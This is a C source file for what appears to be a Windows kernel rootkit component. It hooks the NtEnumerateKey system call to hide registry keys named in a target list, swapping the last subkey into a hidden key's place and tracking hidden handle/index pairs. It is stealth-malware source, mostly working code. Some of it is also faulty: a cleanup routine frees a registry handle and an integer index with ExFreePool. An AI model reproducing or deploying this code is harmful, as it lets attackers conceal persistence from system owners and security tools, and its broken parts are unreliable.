#include "key.h"

ULONG StrLenghtW(PWCHAR wstr) {
	ULONG i = 0;
	while (wstr[i++] != L'\0');
	return i;
}

NTSTATUS NTAPI HookNtEnumerateKey(
	HANDLE                KeyHandle,
	ULONG                 Index,
	KEY_INFORMATION_CLASS KeyInformationClass,
	PVOID                 KeyInformation,
	ULONG                 Length,
	PULONG                ResultLength
) {
	NTSTATUS retStatus, newRetStatus;
	PLIST_ENTRY pLink;

	for (pLink = glHideLastKey.Flink; pLink != &glHideLastKey; pLink = pLink->Flink) {
		PHIDE_LAST_KEY task = CONTAINING_RECORD(pLink, HIDE_LAST_KEY, link);
		if (KeyHandle == task->KeyHandle && Index == task->Index)
			return STATUS_NOT_FOUND;
	}

	retStatus = glRealNtEnumerateKey(KeyHandle,
		Index,
		KeyInformationClass,
		KeyInformation,
		Length,
		ResultLength);

	if (NT_SUCCESS(retStatus)) {
		if (*ResultLength != 0) {
			__try {
				newRetStatus = HideKey(KeyInformationClass, KeyInformation);
				if (newRetStatus == STATUS_NOT_FOUND) {
					PKEY_FULL_INFORMATION info;

					newRetStatus = ZwQueryKey(KeyHandle,
						KeyFullInformation,
						KeyInformation,
						sizeof(KEY_FULL_INFORMATION),
						ResultLength);

					info = (PKEY_FULL_INFORMATION)KeyInformation;

					if (NT_SUCCESS(newRetStatus) && info->SubKeys != 0) {
						ULONG lastIndex = info->SubKeys - 1;
						retStatus = glRealNtEnumerateKey(KeyHandle,
							lastIndex,
							KeyInformationClass,
							KeyInformation,
							Length,
							ResultLength);

						ListHidingKeys(KeyHandle, lastIndex);
					}
				}
			}
			__except (EXCEPTION_EXECUTE_HANDLER) {
				DbgPrint("\n\nEXCEPTION KEY\n\n");
			}
		}
	}

	return retStatus;
}

NTSTATUS HideKey(KEY_INFORMATION_CLASS KeyInformationClass, PVOID KeyInformation) {
	if (KeyInformationClass == KeyBasicInformation) {
		PKEY_BASIC_INFORMATION pbi = (PKEY_BASIC_INFORMATION)KeyInformation;
		if (pbi) {
			if (pbi->NameLength != 0 && pbi->Name != NULL) {
				PLIST_ENTRY pLink;
				for (pLink = glTaskQueueKey.Flink; pLink != &glTaskQueueKey; pLink = pLink->Flink) {
					PTASK_QUEUE_KEY task = CONTAINING_RECORD(pLink, TASK_QUEUE_KEY, link);
					if (!wcsncmp(pbi->Name, task->target, pbi->NameLength / sizeof(WCHAR))) {
						return STATUS_NOT_FOUND;		//return STATUS_NO_MORE_ENTRIES; - скроет ключ и все за ним последующие в списке
					}
				}
			}
		}
	}
	else if (KeyInformationClass == KeyNodeInformation) {
		PKEY_NODE_INFORMATION pni = (PKEY_NODE_INFORMATION)KeyInformation;
		if (pni) {
			if (pni->NameLength != 0 && pni->Name != NULL) {
				PLIST_ENTRY pLink;
				for (pLink = glTaskQueueKey.Flink; pLink != &glTaskQueueKey; pLink = pLink->Flink) {
					PTASK_QUEUE_KEY task = CONTAINING_RECORD(pLink, TASK_QUEUE_KEY, link);
					if (!wcsncmp(pni->Name, task->target, pni->NameLength / sizeof(WCHAR))) {
						return STATUS_NOT_FOUND;
					}
				}
			}
		}
	}
	else if (KeyInformationClass == KeyNameInformation) {
		//KdPrint(("KeyNameInformation %ws\n", unName.Buffer));
	}
	else if (KeyInformationClass == KeyFullInformation) {
		//KdPrint(("KeyFullInformation\n"));
	}
	else if (KeyInformationClass == KeyCachedInformation) {
		//KdPrint(("KeyCachedInformation\n"));
	}

	return STATUS_SUCCESS;
}

PWCH AnsiToUnicodeKey(char* str) {

	ANSI_STRING ansiStr;
	UNICODE_STRING uniStr;
	USHORT length;

	RtlInitAnsiString(&ansiStr, str);
	length = (USHORT)RtlAnsiStringToUnicodeSize(&ansiStr);
	uniStr.Buffer = (PWCH)ExAllocatePoolWithTag(PagedPool, length, 'oneN');
	uniStr.MaximumLength = length;
	RtlAnsiStringToUnicodeString(&uniStr, &ansiStr, FALSE);
	
	return uniStr.Buffer;
}

VOID TaskQueueByKey(PCHAR target) {
	if (target != NULL) {
		PTASK_QUEUE_KEY task = (PTASK_QUEUE_KEY)ExAllocateFromPagedLookasideList(&glPagedTaskQueueKey);

		task->target = AnsiToUnicodeKey(target);

		InsertTailList(&glTaskQueueKey, &task->link);
	}
}

VOID ListHidingKeys(HANDLE KeyHandle, ULONG Index) {
	if (KeyHandle != NULL && Index != NULL) {
		PHIDE_LAST_KEY task = (PHIDE_LAST_KEY)ExAllocateFromPagedLookasideList(&glPagedHideLastKey);

		task->KeyHandle = KeyHandle;
		task->Index = Index;

		InsertTailList(&glHideLastKey, &task->link);
	}
}

VOID FreeTaskQueueKeyList() {
	while (!IsListEmpty(&glTaskQueueKey)) {
		PLIST_ENTRY pLink = RemoveHeadList(&glTaskQueueKey);
		PTASK_QUEUE_KEY task = CONTAINING_RECORD(pLink, TASK_QUEUE_KEY, link);
		if (task->target) ExFreePool(task->target);
		ExFreeToPagedLookasideList(&glPagedTaskQueueKey, task);
	}
}

VOID FreeListHidingKeys() {
	while (!IsListEmpty(&glHideLastKey)) {
		PLIST_ENTRY pLink = RemoveHeadList(&glHideLastKey);
		PHIDE_LAST_KEY task = CONTAINING_RECORD(pLink, HIDE_LAST_KEY, link);
		if (task->KeyHandle) ExFreePool(task->KeyHandle);
		if (task->Index) ExFreePool(task->Index);

		ExFreeToPagedLookasideList(&glPagedHideLastKey, task);
	}
}

VOID PrintTaskQueueKeyList() {
	PLIST_ENTRY pLink;
	DbgPrint("TASK QUEUE FOR ADD KEY\n");
	for (pLink = glTaskQueueKey.Flink; pLink != &glTaskQueueKey; pLink = pLink->Flink) {
		PTASK_QUEUE_KEY task = CONTAINING_RECORD(pLink, TASK_QUEUE_KEY, link);

		if (task->target) {
			DbgPrint("TARGET:%ws\t", (PCHAR)task->target);
		}
	}
}